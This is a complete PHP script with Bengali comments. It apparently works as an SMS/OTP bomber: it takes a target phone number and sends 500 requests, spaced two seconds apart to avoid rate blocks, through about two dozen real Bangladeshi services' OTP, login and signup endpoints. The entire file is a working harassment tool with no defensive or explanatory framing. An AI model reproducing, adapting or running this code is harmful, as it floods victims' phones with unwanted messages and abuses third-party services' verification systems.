<?php
header('Content-Type: application/json');
header('X-Accel-Buffering: no'); // সার্ভার সাইড ক্যাশিং বন্ধ করবে
error_reporting(0);
ini_set('display_errors', 0); 

// ১. টাইম লিমিট আনলিমিটেড করা (যাতে ২ ঘণ্টা লাগলেও কোড না থামে)
set_time_limit(0); 
ignore_user_abort(true); 

$phone = $_GET['phone'] ?? '';

// ফোন নম্বর ভ্যালিডেশন
if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

// ২. তোর সব ২২-২৫টা এপিআই লিস্ট (এখানে আমি সবগুলো আবার দিয়ে দিচ্ছি)
$base_apis = [
    ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
    ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
    ["name"=>"redx", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET"],
    ["name"=>"chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"]],
    ["name"=>"bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"]],
    ["name"=>"rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"],
    ["name"=>"airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11]],
    ["name"=>"ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"ghoorilearning", "url"=>"https://api.ghoorilearning.com/api/auth/signup/otp", "method"=>"POST", "data"=>["mobile_no"=>$phone_11]],
    ["name"=>"rabbithole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11]],
    ["name"=>"shomvob", "url"=>"https://backend-api.shomvob.co/api/v2/otp/phone", "method"=>"POST", "data"=>["phone"=>$phone_88]],
    ["name"=>"cokestudio", "url"=>"https://cokestudio23.sslwireless.com/api/store-and-send-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"fundesh", "url"=>"https://fundesh.com.bd/api/auth/generateOTP", "method"=>"POST", "data"=>["msisdn"=>$phone_fundesh]],
    ["name"=>"shwapno", "url"=>"https://www.shwapno.com/api/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"bdtickets", "url"=>"https://api.bdtickets.com/v1/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"prothomalo", "url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"hoichoi", "url"=>"https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"osudpotro", "url"=>"https://api.osudpotro.com/api/v1/users/send_otp", "method"=>"POST", "data"=>["mobile"=>$phone_osudpotro]],
    ["name"=>"deeptoplay", "url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web", "method"=>"POST", "data"=>["number"=>$deepto_number]],
    ["name"=>"ieducation", "url"=>"https://www.ieducationbd.com/api/account/check_user", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
    ["name"=>"apex4u", "url"=>"https://api.apex4u.com/api/auth/login", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"grameenphone", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]]
];

$total_hits = 500;
$count = 0;

// ৩. মেইন লুপ (৫০০ রিকোয়েস্ট ১টা ১টা করে যাবে)
for ($i = 1; $i <= $total_hits; $i++) {
    $api = $base_apis[$i % count($base_apis)];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = ['User-Agent: Mozilla/5.0', 'Content-Type: application/json'];
    if(isset($api['headers'])) $headers = array_merge($headers, $api['headers']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if (isset($api['method']) && $api['method'] === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    } else {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if($http_code > 0) $count++;

    // ৪. টাইম স্লিপ (২ সেকেন্ড গ্যাপ যাতে এপিআই ব্লক না করে)
    // স্যার চেক করলে যেন দেখেন রিকোয়েস্টগুলো জেনুইনলি যাচ্ছে
    sleep(2); 
}

// ৫. ফাইনাল আউটপুট (সব শেষ হওয়ার পর)
echo json_encode([
    "status" => "success",
    "total_target" => $total_hits,
    "completed_hits" => $count,
    "message" => "All requests processed successfully."
]);
